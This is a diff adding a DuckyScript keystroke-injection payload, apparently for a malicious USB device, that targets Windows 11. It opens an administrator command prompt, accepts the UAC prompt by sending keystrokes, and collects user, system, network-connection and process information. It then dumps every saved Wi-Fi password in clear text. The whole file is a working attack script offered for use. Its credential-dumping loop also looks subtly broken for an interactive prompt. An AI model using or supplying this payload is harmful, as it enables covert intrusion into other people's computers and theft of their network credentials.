@@ -1,0 +1,62 @@
+REM === Full Recon + Wi-Fi Passwords (Windows 11) ===
+DELAY 1000
+
+REM Open CMD as Admin
+GUI r
+DELAY 300
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+
+REM Section 1: whoami /all
+STRING echo ==== WHOAMI /ALL ==== 
+ENTER
+STRING whoami /all
+ENTER
+DELAY 1500
+
+REM Section 2: systeminfo
+STRING echo. 
+ENTER
+STRING echo ==== SYSTEMINFO ====
+ENTER
+STRING systeminfo
+ENTER
+DELAY 2000
+
+REM Section 3: netstat -ano
+STRING echo. 
+ENTER
+STRING echo ==== NETSTAT -ANO ====
+ENTER
+STRING netstat -ano
+ENTER
+DELAY 2000
+
+REM Section 4: tasklist
+STRING echo. 
+ENTER
+STRING echo ==== TASKLIST ====
+ENTER
+STRING tasklist
+ENTER
+DELAY 1500
+
+REM Section 5: Wi-Fi Profiles List
+STRING echo.
+ENTER
+STRING echo ==== WIFI PROFILES ====
+ENTER
+STRING netsh wlan show profiles
+ENTER
+DELAY 1500
+
+REM Section 6: Show passwords for each profile
+STRING echo. 
+ENTER
+STRING echo ==== STORED WIFI PASSWORDS ====
+ENTER
+STRING for /f "tokens=4 delims=: " %%a in ('netsh wlan show profiles ^| findstr "All"') do @echo Profile: %%a & netsh wlan show profile name="%%a" key=clear | findstr "Key Content"
+ENTER
